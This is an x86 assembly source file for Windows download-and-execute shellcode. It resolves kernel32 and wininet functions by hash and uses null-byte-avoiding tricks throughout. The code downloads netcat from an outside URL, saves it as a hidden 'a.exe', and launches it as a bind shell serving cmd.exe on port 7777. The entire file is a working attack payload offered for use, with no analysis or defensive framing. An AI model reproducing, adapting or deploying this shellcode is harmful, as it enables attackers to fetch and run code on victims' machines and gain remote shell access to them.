[BITS 32]
;=============================================


section .txt
Start:

;======================download&execute===========================
;make target machine download nc.exe
;input:		
;output:	
;====================================================
download:
;=============================================
;hash for symbols in kernel32.dll

;======================================================================
download_start:
	;some bad characters(0x00) in data section, we replace it with 0x01, now we first change it back
	jmp short get_hash_address_1
get_hash_address:
	pop esi
	
	
	xor eax, eax
	mov al, 0x7c
	sub esp, eax	;allocate 0x7c bytes of stack space
	mov ebp, esp
	mov [ebp + 0x50], esi			;;save kernel32_symbol_hashs address in [ebp+0x50]		

	
;=================resolve symbols and load wininet======================;
	call find_kernel32	;put the VMA of kernel32.dll in eax
	mov edx, eax		;move VMA of kernel32.ddl in edx
	
	mov esi, [ebp+0x50]	;put the VMA of symbols' hash in esi

resolve_kernel32_symbols:	
	
	lea edi, [ebp + 0x04]	;load the address of the output buffer to store the VMA of the resolved symbols into edi
	mov ecx, esi			;move VMA of hash in ecx
	xor eax, eax
	mov al, 0x18
	add ecx, eax			;add 0x18 to ecx to signify the boundary for the last function to be resolved from kernel32.dll(6 symbols)
	call resolve_symbols_for_dll
	
	
	
resolve_wininet_symbols:
	xor eax, eax
	add al, 0x0c
	add ecx, eax			;3 symbols
	mov eax, 0x74656e01		;set eax to 'net', 0x01
	sar eax, 0x08			;eax='net':shift eax 2 bytes to the right to eliminate 0x01 and put 0x00 in the highest byte of eax
	push eax				;push 'net' into stack
	mov eax, 0x696e6977
	push eax				;push 'wini' into stack
	mov ebx, esp			;ebx is the pointer to the null-terminated 'wininet' string
	push ecx
	push edx
	push ebx				;push pointer to 'wininet' string as the first argument to LoadLibraryA
	call dword [ebp + 0x04]		;call LoadLibraryA and map wininet.dll into process space
	pop edx					;restore edx
	pop ecx					;restore ecd
	mov edx, eax			;set edx to wininet's address
	call resolve_symbols_for_dll	;resolve symbols of the functions in wininet.dll
;=================resolve symbols and load wininet======================;

jmp short get_hash_address_1_skip
get_hash_address_1:
	jmp short get_hash_address_2
get_hash_address_1_skip:


;===================get handle==================================;
internet_open:
	xor eax, eax
	push eax						;push dwFlags
	push eax						;push lpszProxyBypass
	push eax						;push lpszProxyName	
	push eax						;push dwAccessType
	push eax						;push lpszAgent
	call dword [ebp + 0x1c]				;call internetOpenA to create and internet handle for use with InternetOpenUrlA
	mov [ebp + 0x34], eax			;save the handle returned from InternetOpenA for later use
internet_open_url:
	xor eax, eax
	push eax						;push dwContext
	push eax						;push dwFlags
	push eax						;push dwHeadersLength
	push eax						;push lpszHeaders
	xor ebx, ebx
	mov bl, 0x45
	add ebx, [ebp + 0x50]							;load the address of the URL to ebx
	push ebx						;push address of the URL
	push dword [ebp + 0x34]				;push handle return from InternetOpenA
	call dword [ebp + 0x20]				;call InternetOpenUrlA
	mov [ebp + 0x38], eax			;save the handle returned from InternetOpenUrlA for later use
;===================get handle==================================;

;===================create file=================================;
create_file:
	
	xor eax, eax
	push eax					;push gTemplateFile
	mov al, 0x82
	push eax					;push FILE_ATTRIBUTE_NORMAL&FILE_ATTRIBUTE_HIDDEN
	mov al, 0x02				;set al = CREATE_ALWAYS
	push eax					;push dwCreationDisposition
	xor al, al
	push eax					;push lpSecurityAttribute
	push eax					;push dwShareMode
	mov al, 0x40				;set al = GENERIC_WRITE
	sal eax, 0x18
	push eax					;push dwDesiredAccess
	xor eax, eax
	mov al, 0x24
	add eax, [ebp + 0x50]
	push eax					;push pointer to 'a.exe' as lpFileName
	call dword [ebp + 0x08]			;call CreateFile to create a.exe as hiddern file and open it with write permission
	mov [ebp + 0x3c], eax		;save the file handle for later use
;===================create file=================================;

jmp short get_hash_address_2_skip
get_hash_address_2:
	jmp short get_hash_address_3
get_hash_address_2_skip:


;===================download====================================;
download_begin:
	xor eax, eax
	mov ax, 0x010c
	sub esp, eax				;allocate 268 bytes of stack space
	mov esi, esp
download_loop:
	lea ebx, [esi + 0x04]		;4 bytes offset from stack frame pointer, this location will hold the number of bytes read from the wire
	push ebx					;push pointer as lpdwNumberOfBytesRead
	mov ax, 0x0104				;set eax=260
	push eax					;push dwNumberOfBytesToRead
	lea eax, [esi + 0x08]		;set the point 8 bytes offset from stack frame pointer, which is used as the buffer for storaging the read
	push eax					;push lpBuffer
	push dword [ebp + 0x38]			;push hFile returned from InternetOpenUrlA
	call dword [ebp + 0x24]			;call InternetReadFile
	mov eax, [esi + 0x04]		;move the number of bytes actually read into eax
	test eax, eax				;judge if the file has been reached
	jz download_finished
download_write_file:
	xor eax, eax
	push eax					;push lpOverlapped
	lea eax, [esi + 0x04]
	push eax					;push lpdwNumberOfBytesRead(pointer to hold the number of bytes)
	push dword [esi + 0x04]			;push nNumberOfBytesToWrite(the number of bytes that were read from the wire)
	lea eax, [esi + 0x08]		;load the address of the buffer that was read into from the wire
	push eax					;push lpBuffer
	push dword [ebp + 0x3c]			;push the handle to the file that was returned from CreateFile
	call dword [ebp + 0x0c]			;call WriteFile to write the data read from the wire to the file
	jmp download_loop			;continue downloading
download_finished:
	push dword [ebp + 0x3c]			;push the handle to the file
	call dword [ebp + 0x10]			;call closeHandle
	xor eax, eax
	mov ax, 0x010c
	add esp, eax				;restore stack size
;===================download====================================;


jmp short get_hash_address_3_skip
get_hash_address_3:
	jmp short get_hash_address_4
get_hash_address_3_skip:


;====================start process=============================;
initialize_process:
	xor ecx, ecx
	mov cl, 0x54			;size of STARTUPINFO&PROCESS_INFORMATION structure
	sub esp, ecx			;allocate 0x54 bytes of stack space
	mov edi, esp
zero_structs:
	xor eax, eax
	rep stosb				;repeat storing 0 at [edi] until ecx is 0
initialize_structs:
	mov edi, esp
	mov byte [edi], 0x44	;set the cb attribute of STARTUPINFO to the size of the structure(0x44)
execute_process:
	lea esi, [edi + 0x44]		;load the address of the PROCESS_INFORMATION structure into esi
	push esi					;push lpProcessInformation
	push edi					;push lpStartupInfo
	push eax					;push lpCurrentDirectory
	push eax					;push lpEnvironment
	push eax					;push dwCreationFlags
	push eax					;push bInheritHandles
	push eax					;push ThreadAttributes
	push eax					;push lpProcessAttribute
	xor ebx, ebx
	mov bl, 0x2A
	add ebx, [ebp+0x50]
	push ebx					;push lpCommandLine(pointer to cmd)
	push eax					;push lpApplicationName
	call dword [ebp + 0x14]			;call createProcess
exit_process:
	call dword [ebp + 0x18]			;call exitProcess
	ret
	
;====================================================



;====================================================
;resolve symbols within dll
;input:		load the function's hash at esi, edx(dll's address)
;output:	
;====================================================
resolve_symbols_for_dll:
	lodsd		;load esi to eax, add 0x04 to esi
	push eax	;push function's hash
	push edx	;push dll's address
	call find_function	;resolve the function's address
	mov [edi], eax	;store the function's addre in [edi]
	xor eax, eax
	add al, 0x08
	add esp, eax	;restore 8 bytes to the stack for the two arguments(eax, edx)
	sub al, 0x04
	add edi, eax	;add 0x04 to edi, make edi available for next function's address output
	cmp esi, ecx	;check if compare all the function's hash
	jne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
	ret
;====================================================

jmp short get_hash_address_4_skip
get_hash_address_4:
	jmp short get_hash_address_5
get_hash_address_4_skip:
	
;======================find_kernel32==========================
;find kernel32.dll	(PEB method)
;input:		none
;output:	eax(kernel32.dll's address)
;====================================================
find_kernel32:
	push esi
	xor eax, eax
	mov eax, [fs:eax+0x30]	;get the PEB Pointer
	test eax, eax
	js find_kernel32_9x
find_kernel32_nt:
	mov eax, [eax + 0x0c]	;get the Module list Pointer
	mov esi, [eax + 0x1c]	;get InloadOrderModuleList Pointer
	lodsd					;load every from InloadOrderModuleList
	mov eax, [eax + 0x8]	;get the send entry(kernel32.dll's address)
	xor ebx, ebx
	jmp find_kernel32_finished
find_kernel32_9x:
	mov eax, [eax + 0x34]
	lea eax, [eax + 0x7c]
	mov eax, [eax + 0x3c]
find_kernel32_finished:
	pop esi
	ret
;======================find_kernel32==========================


jmp short get_hash_address_5_skip
get_hash_address_5:
	jmp short kernel32_symbol_hashs
get_hash_address_5_skip:


;=======================find_function=========================
;find function with hash
;input:		push hash of the function's name and dll's address before call this function
;output:	eax(address of the function)
;====================================================
find_function:
	pushad
	mov ebp, [esp + 0x24]	;put dll's address in ebp
	mov eax, [ebp + 0x3c]	;put PE header in eax
	mov edx, [ebp + eax + 0x78]	;put export table in edx
	add edx, ebp			;make the the export table address absolute by adding the dll's address
	mov ecx, [edx + 0x18]	;extract the number of exported items
	mov ebx, [edx + 0x20]	;extract the names table relative offset
	add ebx, ebp			;make the names table address absolute storing in ebp
	
	;the true process of finding address of the function
find_function_loop:
	jecxz find_function_finished
	dec ecx
	mov esi, [ebx + ecx * 4]
	add esi, ebp
compute_hash:
	xor edi, edi
	xor eax, eax
	cld
compute_hash_again:
	lodsb
	test al, al
	jz compute_hash_finished
	ror edi, 0xd
	add edi, eax
	jmp compute_hash_again
compute_hash_finished:
find_function_compare:
	cmp edi, [esp + 0x28]
	jnz find_function_loop
	mov ebx, [edx + 0x24]
	add ebx, ebp
	mov cx, [ebx + 2 * ecx]
	mov ebx, [edx + 0x1c]
	add ebx, ebp
	mov eax, [ebx + 4 * ecx]
	add eax, ebp		;make the function's address absolute
	mov [esp + 0x1c], eax	;Overwrite the stack copy of the preserved eax register so that when popad is finished the appropriate return value will be set.
find_function_finished:
	popad
	ret
;=======================find_function=========================

;============================================================
kernel32_symbol_hashs:
	call dword get_hash_address
	;LoadLibraryA
    db 0x8e, 0x4e, 0x0e, 0xec
	;CreateFile
	db 0xa5, 0x17, 0x00, 0x7c
	;WriteFile
	db 0x1f, 0x79, 0x0a, 0xe8
	;CloseHandle
	db 0xfb, 0x97, 0xfd, 0x0f
    ;CreateProcessA
    db 0x72, 0xfe, 0xb3, 0x16
    ;ExitProcess 0x18
    db 0x7e, 0xd8, 0xe2, 0x73
wininet_symbol_hashes:
	;InternetOpenA 0x1c
	db 0x29, 0x44, 0xe8, 0x57
	;InternetOpenUrl 0x20
	db 0x49, 0xed, 0x0f, 0x7e
	;InternetReadFile
	db 0x8b, 0x4b, 0xe3, 0x5f
file: db "a.exe", 0x00
cmd: db "a.exe -e cmd.exe -l -p 7777"
nc_url:
db 'http://www.thaoh.net/Tools/Netcat/dl/nc.exe', 0x00